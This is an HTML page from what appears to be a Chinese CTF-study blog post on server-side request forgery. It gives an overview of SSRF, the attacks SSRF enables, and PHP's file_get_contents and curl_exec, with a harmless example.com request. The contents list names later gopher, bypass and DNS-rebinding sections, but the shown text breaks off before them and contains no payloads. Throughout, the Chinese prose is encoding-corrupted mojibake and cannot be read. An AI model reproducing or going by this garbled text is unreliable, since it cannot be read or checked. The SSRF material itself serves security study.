<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="SSRF(Server-Side Request Forgery)æ¦‚è¿°[TOC] SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ),å­—é¢æ„æ€æ¥ç†è§£å°±æ˜¯ï¼šæ”»å‡»è€…é€šè¿‡ä¸€äº›æ‰‹æ®µæ¥è¾¾åˆ°ä¼ªè£…äº†ä¸€ä¸ªç”±æœåŠ¡ç«¯å¯¹æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘å‘èµ·çš„æ¶æ„è¯·æ±‚ã€‚ ä¹Ÿå› æ­¤ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="SSRFå­¦ä¹ ">
<meta property="og:url" content="http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="y@7q">
<meta property="og:description" content="SSRF(Server-Side Request Forgery)æ¦‚è¿°[TOC] SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ),å­—é¢æ„æ€æ¥ç†è§£å°±æ˜¯ï¼šæ”»å‡»è€…é€šè¿‡ä¸€äº›æ‰‹æ®µæ¥è¾¾åˆ°ä¼ªè£…äº†ä¸€ä¸ªç”±æœåŠ¡ç«¯å¯¹æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘å‘èµ·çš„æ¶æ„è¯·æ±‚ã€‚ ä¹Ÿå› æ­¤ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416011910810.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416002956517.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416080803299.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416083848457.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416084453141.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/Quicker_20250416_091903.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416102926004.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416105222070.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416112945370.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416193201139.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416194828764.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/2289942-20220124211658010-532695203.png">
<meta property="article:published_time" content="2025-04-15T13:03:09.000Z">
<meta property="article:modified_time" content="2025-08-01T03:43:59.724Z">
<meta property="article:author" content="y@7q">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="SSRF">
<meta property="article:tag" content="åˆ·é¢˜">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416011910810.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>SSRFå­¦ä¹ </title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="ç›®å½•"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="ç›®å½•"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="é¡¶éƒ¨" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">é¦–é¡µ</a></li><!--
     --><!--
       --><li><a href="/about/">å…³äº</a></li><!--
     --><!--
       --><li><a href="/archives/">å½’æ¡£</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">é¡¹ç›®</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="ä¸Šä¸€ç¯‡" href="/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/RCE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="ä¸‹ä¸€ç¯‡" href="/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/CSRF%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="è¿”å›é¡¶éƒ¨" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="åˆ†äº«æ–‡ç« " href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">ä¸Šä¸€ç¯‡</span>
      <span id="i-next" class="info" style="display:none;">ä¸‹ä¸€ç¯‡</span>
      <span id="i-top" class="info" style="display:none;">è¿”å›é¡¶éƒ¨</span>
      <span id="i-share" class="info" style="display:none;">åˆ†äº«æ–‡ç« </span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&text=SSRFå­¦ä¹ "><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRFå­¦ä¹ "><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&is_video=false&description=SSRFå­¦ä¹ "><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SSRFå­¦ä¹ &body=Check out this article: http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRFå­¦ä¹ "><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRFå­¦ä¹ "><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRFå­¦ä¹ "><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRFå­¦ä¹ "><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&name=SSRFå­¦ä¹ &description=&lt;h1 id=&#34;SSRF-Server-Side-Request-Forgery-æ¦‚è¿°&#34;&gt;&lt;a href=&#34;#SSRF-Server-Side-Request-Forgery-æ¦‚è¿°&#34; class=&#34;headerlink&#34; title=&#34;SSRF(Server-Side Request Forgery)æ¦‚è¿°&#34;&gt;&lt;/a&gt;SSRF(Server-Side Request Forgery)æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )&lt;/strong&gt;,å­—é¢æ„æ€æ¥ç†è§£å°±æ˜¯ï¼šæ”»å‡»è€…é€šè¿‡ä¸€äº›æ‰‹æ®µæ¥è¾¾åˆ°ä¼ªè£…äº†ä¸€ä¸ªç”±æœåŠ¡ç«¯å¯¹æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘å‘èµ·çš„æ¶æ„è¯·æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;ä¹Ÿå› æ­¤ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/&t=SSRFå­¦ä¹ "><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF-Server-Side-Request-Forgery-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">SSRF(Server-Side Request Forgery)æ¦‚è¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%A2%E6%88%90%E5%8E%9F%E7%90%86%E5%8F%8A%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.1.</span> <span class="toc-text">å½¢æˆåŸç†åŠå±å®³</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">åˆ©ç”¨æ–¹å¼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">PHPä¸­ä¸€äº›å…³é”®å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">ä¼ªåè®®</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file-%EF%BC%88%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;ï¼ˆè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dict-%EF%BC%88%E6%9F%A5%E8%AF%A2%E5%AD%97%E5%85%B8%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">dict:&#x2F;&#x2F;ï¼ˆæŸ¥è¯¢å­—å…¸æœåŠ¡ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp-%EF%BC%88%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%EF%BC%89"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">ftp:&#x2F;&#x2F;ï¼ˆè®¿é—®è¿œç¨‹æ–‡ä»¶èµ„æºï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data-%EF%BC%88%E5%B5%8C%E5%85%A5%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">data:&#x2F;&#x2F;ï¼ˆåµŒå…¥æ•°æ®ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Parse-url%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">Parse_urlå‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8Payload"><span class="toc-number">1.2.4.</span> <span class="toc-text">å¸¸ç”¨Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.3.</span> <span class="toc-text">é¢˜ç›®å›é¡¾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageCloud%E5%89%8D%E7%BD%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">ImageCloudå‰ç½®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageCloud"><span class="toc-number">1.3.2.</span> <span class="toc-text">ImageCloud</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow%E5%88%B7%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">CTFshowåˆ·é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web352"><span class="toc-number">1.4.1.</span> <span class="toc-text">web352</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web353"><span class="toc-number">1.4.2.</span> <span class="toc-text">web353</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web354-%E5%85%AC%E5%85%B1%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.3.</span> <span class="toc-text">web354 å…¬å…±è§£æåŸŸåç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web355-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B61"><span class="toc-number">1.4.4.</span> <span class="toc-text">web355 é•¿åº¦é™åˆ¶1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web356-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B62"><span class="toc-number">1.4.5.</span> <span class="toc-text">web356 é•¿åº¦é™åˆ¶2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web357-%E5%86%85%E7%BD%91IP%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.6.</span> <span class="toc-text">web357 å†…ç½‘IPè¿‡æ»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter-var-%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">filter_var() å‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.4.6.2.</span> <span class="toc-text">ç›¸å…³è¿‡æ»¤å™¨</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web358-%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.7.</span> <span class="toc-text">web358 @ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web359-Gopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81%E7%9A%84mysql"><span class="toc-number">1.4.8.</span> <span class="toc-text">web359 Gopheræ‰“æ— å¯†ç çš„mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web360-Gopher%E5%8D%8F%E8%AE%AE%E6%89%93redis"><span class="toc-number">1.4.9.</span> <span class="toc-text">web360 Gopheråè®®æ‰“redis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B7%E9%A2%98%E4%B9%8B%E5%90%8E%E7%9A%84bypass%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">åˆ·é¢˜ä¹‹åçš„bypassæ€»ç»“</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.1.</span> <span class="toc-text">å­—ç¬¦ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AC%E7%BD%91%E6%8C%82%E9%A9%AC"><span class="toc-number">1.5.2.</span> <span class="toc-text">å…¬ç½‘æŒ‚é©¬</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">1.5.3.</span> <span class="toc-text">DNSé‡ç»‘å®š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A1-%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-number">1.6.</span> <span class="toc-text">ğŸ’¡ å®æˆ˜åœºæ™¯ä¸¾ä¸ªä¾‹å­</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="toc-number">1.7.</span> <span class="toc-text">ğŸ§  è¯¦ç»†è¿‡ç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopherus%E4%BD%BF%E7%94%A8"><span class="toc-number">1.7.1.</span> <span class="toc-text">Gopherusä½¿ç”¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EGopher%E5%8D%8F%E8%AE%AE%E4%B8%BA%E4%BB%80%E4%B9%88%E5%90%8E%E9%9D%A2%E8%A6%81%E6%9C%89%E4%B8%80%E4%B8%AA"><span class="toc-number">1.8.</span> <span class="toc-text">å…³äºGopheråè®®ä¸ºä»€ä¹ˆåé¢è¦æœ‰ä¸€ä¸ª_?</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        SSRFå­¦ä¹ 
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">y@7q</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-04-15T13:03:09.000Z" class="dt-published" itemprop="datePublished">2025-04-15</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%90%AD%E5%BB%BA/">åŸºç¡€çŸ¥è¯†æ­å»º</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="p-category" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">åˆ·é¢˜</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="SSRF-Server-Side-Request-Forgery-æ¦‚è¿°"><a href="#SSRF-Server-Side-Request-Forgery-æ¦‚è¿°" class="headerlink" title="SSRF(Server-Side Request Forgery)æ¦‚è¿°"></a>SSRF(Server-Side Request Forgery)æ¦‚è¿°</h1><p>[TOC]</p>
<p><strong>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</strong>,å­—é¢æ„æ€æ¥ç†è§£å°±æ˜¯ï¼šæ”»å‡»è€…é€šè¿‡ä¸€äº›æ‰‹æ®µæ¥è¾¾åˆ°ä¼ªè£…äº†ä¸€ä¸ªç”±æœåŠ¡ç«¯å¯¹æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘å‘èµ·çš„æ¶æ„è¯·æ±‚ã€‚</p>
<p>ä¹Ÿå› æ­¤ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚</p>
<span id="more"></span>
<h2 id="å½¢æˆåŸç†åŠå±å®³"><a href="#å½¢æˆåŸç†åŠå±å®³" class="headerlink" title="å½¢æˆåŸç†åŠå±å®³"></a>å½¢æˆåŸç†åŠå±å®³</h2><p>å¤§å¤šæ˜¯å› ä¸ºæœåŠ¡ç«¯æä¾›äº†å¯ä»¥ä»å…¶ä»–æœåŠ¡å™¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä½†æ²¡æœ‰åŠ ä»¥è¿‡æ»¤å’Œé™åˆ¶ï¼Œå¯¼è‡´äº†æ”»å‡»è€…å¯ä»¥è½»æ˜“çš„ä»»æ„è¯»å–æ–‡ä»¶ï¼Œè¿›è¡Œå†…ç½‘æ¸—é€ï¼Œå¯¹å†…ç½‘Webåº”ç”¨è¿›è¡Œæ”»å‡»ç­‰æ¶æ„æ“ä½œã€‚</p>
<p><strong>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ SSRF å®ç°çš„æ”»å‡»ä¸»è¦æœ‰ 5 ç§ï¼š</strong></p>
<ol>
<li>å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„ banner ä¿¡æ¯</li>
<li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰</li>
<li>å¯¹å†…ç½‘ WEB åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°</li>
<li>æ”»å‡»å†…å¤–ç½‘çš„ web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GET å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆæ¯”å¦‚ Struts2ï¼Œsqli ç­‰ï¼‰</li>
<li>åˆ©ç”¨ <code>file</code> åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰</li>
</ol>
<h2 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h2><h3 id="PHPä¸­ä¸€äº›å…³é”®å‡½æ•°"><a href="#PHPä¸­ä¸€äº›å…³é”®å‡½æ•°" class="headerlink" title="PHPä¸­ä¸€äº›å…³é”®å‡½æ•°"></a>PHPä¸­ä¸€äº›å…³é”®å‡½æ•°</h3><p>file_get_contents() &#x2F;&#x2F; å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸² </p>
<p>file_get_contents(path,include_path,context,start,max_length)</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>$filename</code></td>
<td>æ–‡ä»¶è·¯å¾„æˆ– URLï¼ˆå¯ç”¨ <code>allow_url_fopen</code> æ—¶ï¼‰</td>
</tr>
<tr>
<td><code>$use_include_path</code></td>
<td>æ˜¯å¦åœ¨ include_path ä¸­æŸ¥æ‰¾æ–‡ä»¶</td>
</tr>
<tr>
<td><code>$context</code></td>
<td><code>stream_context</code> ä¸Šä¸‹æ–‡ï¼Œé€‚ç”¨äº HTTP é…ç½®ã€è¶…æ—¶ç­‰</td>
</tr>
<tr>
<td><code>$offset</code></td>
<td>ä»æ–‡ä»¶çš„ç¬¬å‡ å­—èŠ‚å¼€å§‹è¯»å–</td>
</tr>
<tr>
<td><code>$length</code></td>
<td>æœ€å¤šè¯»å–å¤šå°‘å­—èŠ‚å†…å®¹</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">curl_exec</span>() <span class="comment">// </span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">curl_exec</span> ( resource <span class="variable">$ch</span> )</span><br><span class="line">    </span><br><span class="line"><span class="comment">//ç¤ºä¾‹ç”¨æ³•</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;https://example.com&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$response</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;é”™è¯¯ï¼š&quot;</span> . <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å“åº”ï¼š&quot;</span> . <span class="variable">$response</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>ç±»å‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>$ch</code></td>
<td>resource</td>
<td>ä½¿ç”¨ <code>curl_init()</code> åˆå§‹åŒ–åçš„ cURL ä¼šè¯å¥æŸ„</td>
</tr>
</tbody></table>
